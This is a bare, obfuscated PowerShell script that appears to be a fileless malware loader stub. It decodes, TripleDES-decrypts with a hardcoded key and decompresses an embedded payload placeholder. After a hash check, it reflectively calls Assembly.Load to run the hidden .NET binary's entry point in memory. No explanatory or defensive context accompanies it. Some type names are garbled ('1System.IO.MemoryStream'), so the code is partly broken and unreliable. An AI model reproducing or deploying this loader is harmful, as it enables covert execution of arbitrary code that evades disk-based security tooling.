$0V = [System.Convert]::FromBase64String(ENVIRONMENT_VARIABLES);
$1V = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::new();
$1V.Key = [byte[]]@(0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15);
$1V.Mode = 'ECB';
$1V.Padding = 'PKCS7';
$2V = $1V.CreateDecryptor().TransformFinalBlock($0V, 0, $0V.Length);
$3V = New-Object ('1System.IO.MemoryStream') -ArgumentList (,$2V);
$4V = New-Object ('2System.IO.MemoryStream');
$5V = New-Object ('System.IO.Compression.GZipStream') -ArgumentList ($3V, [IO.Compression.CompressionMode]::Decompress);
$5V.CopyTo($4V);
$6V = $4V.ToArray();
$7V = New-Object ('System.Security.Cryptography.SHA256CryptoServiceProvider');
$8V = $7V.ComputeHash($6V);
$9V = [byte[]]@(183,39,47,55,35,11,110,125,2,82,63,79,206,64,75,83,20,25,239,176,189,158,247,103,20,104,196,196,14,76,7,102);
if (-Not (Compare-Object $8V $9V)) {
$10V = (Get-CimInstance ('Win32_Process') -Filter ProcessId=$pid).CommandLine;
foreach ($11V in [AppDomain]::CurrentDomain.GetAssemblies()) {
if ($11V.GlobalAssemblyCache -And $11V.Location.Split('\\')[-1].Equals('mscorlib.dll')) {
foreach ($12V in $11V.GetType('System.Reflection.Assembly').GetMethods([Reflection.BindingFlags]('Public,Static'))) {
if ($12V.ToString()[38] -eq ')') {
$12V.Invoke($null, (,$6V)).EntryPoint.Invoke($null, (,[string[]](,$10V)))
}
}
}
}
}